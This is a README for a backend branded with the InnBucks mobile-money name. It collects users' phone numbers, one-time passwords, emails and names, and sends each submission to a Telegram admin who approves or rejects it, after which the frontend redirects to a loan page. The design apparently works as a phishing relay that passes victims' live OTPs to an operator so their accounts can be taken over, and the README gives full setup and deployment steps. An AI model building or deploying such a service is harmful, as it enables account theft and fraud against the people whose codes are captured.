# InnBucks OTP Verification Backend

Backend service for OTP verification with Telegram bot admin approval.

## Features

- ✅ OTP submission & storage
- ✅ Telegram bot notifications with approval buttons
- ✅ Real-time approval status polling
- ✅ CORS enabled for frontend
- ✅ UUID-based request tracking

## Setup

### 1. Create `.env` file

```bash
cp .env.example .env
```

Edit `.env` with your Telegram bot credentials:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCDefGHijKLmnoPQRstuvwxyz
TELEGRAM_ADMIN_CHAT_ID=987654321
TELEGRAM_CALLBACK_TOKEN=your_secret_token_here
BACKEND_URL=http://localhost:3000
PORT=3000
```

### 2. Get Telegram Bot Credentials

1. Open Telegram and search for **@BotFather**
2. Create a new bot: `/newbot`
3. Get your **Bot Token**
4. Get your **Chat ID**: Message your bot, then visit `https://api.telegram.org/bot{TOKEN}/getUpdates`

### 3. Install Dependencies

```bash
npm install
```

### 4. Run Locally

```bash
npm start
```

Or with auto-reload:

```bash
npm run dev
```

Server starts on `http://localhost:3000`

---

## API Endpoints

### **POST** `/api/otp/submit`

Submit an OTP request for approval.

**Request:**

```json
{
  "phone": "+263712345678",
  "otp": "12345",
  "userId": "user@example.com",
  "email": "user@example.com",
  "firstName": "John",
  "lastName": "Doe"
}
```

**Response:**

```json
{
  "success": true,
  "requestId": "550e8400-e29b-41d4-a716-446655440000",
  "message": "OTP submitted. Awaiting admin approval."
}
```

---

### **GET** `/api/otp/status/:requestId`

Check if an OTP request was approved.

**Response (Pending):**

```json
{
  "approved": false,
  "rejected": false,
  "message": "Pending approval"
}
```

**Response (Approved):**

```json
{
  "approved": true,
  "rejected": false,
  "message": null,
  "data": {
    "phone": "+263712345678",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe"
  }
}
```

**Response (Rejected):**

```json
{
  "approved": false,
  "rejected": true,
  "message": "Admin rejected the OTP request"
}
```

---

### **GET** `/api/health`

Health check endpoint.

**Response:**

```json
{
  "status": "ok",
  "service": "OTP Backend"
}
```

---

## Frontend Integration

The frontend polls this endpoint every 2 seconds:

```javascript
const interval = setInterval(async () => {
  const res = await fetch(
    `https://your-backend.com/api/otp/status/${requestId}`,
  );
  const data = await res.json();

  if (data.approved) {
    clearInterval(interval);
    window.location.href = "loan7.html";
  }
}, 2000);
```

---

## Telegram Bot Flow

1. User enters OTP on frontend
2. Frontend sends to `/api/otp/submit`
3. Backend notifies Telegram admin with **[✅ APPROVE]** and **[❌ REJECT]** buttons
4. Admin clicks button
5. Backend updates request status
6. Frontend detects approval and proceeds

---

## Deployment

### **Render** (Recommended)

1. Connect GitHub repo to Render
2. Create new **Web Service**
3. Set environment variables in Render dashboard
4. Deploy automatically on push

### **Railway**

```bash
railway init
railway link
railway up
```

### **Heroku**

```bash
heroku create innbucks-otp-backend
heroku config:set TELEGRAM_BOT_TOKEN=xxx
heroku config:set TELEGRAM_ADMIN_CHAT_ID=xxx
git push heroku main
```

---

## Environment Variables for Production

| Variable                  | Example                   | Required |
| ------------------------- | ------------------------- | -------- |
| `TELEGRAM_BOT_TOKEN`      | `123456:ABC...`           | Yes      |
| `TELEGRAM_ADMIN_CHAT_ID`  | `987654321`               | Yes      |
| `TELEGRAM_CALLBACK_TOKEN` | `secret_key_123`          | Yes      |
| `BACKEND_URL`             | `https://api.example.com` | Yes      |
| `PORT`                    | `3000`                    | No       |

---

## Testing

```bash
# Test health check
curl http://localhost:3000/api/health

# Test OTP submission
curl -X POST http://localhost:3000/api/otp/submit \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "+263712345678",
    "otp": "12345",
    "userId": "test",
    "email": "test@example.com",
    "firstName": "Test",
    "lastName": "User"
  }'

# Test status check
curl http://localhost:3000/api/otp/status/your-request-id
```

---

## Notes

- Requests expire after **5 minutes** (configurable)
- Uses in-memory storage (add MongoDB/PostgreSQL for persistence)
- Bot sends HTML-formatted messages
- All endpoints support CORS

---

## Troubleshooting

**Bot not sending messages?**

- Check `TELEGRAM_BOT_TOKEN` is correct
- Check `TELEGRAM_ADMIN_CHAT_ID` is correct
- Verify bot is not blocked by admin

**Frontend not receiving updates?**

- Check `BACKEND_URL` matches deployment URL
- Verify CORS headers are correct
- Check frontend request ID matches backend

---

## Security Considerations

- Use HTTPS in production
- Rotate `TELEGRAM_CALLBACK_TOKEN` regularly
- Store sensitive data in `.env` (never commit)
- Add rate limiting for production
- Validate all inputs
- Use database transactions for persistence

---

## License

MIT
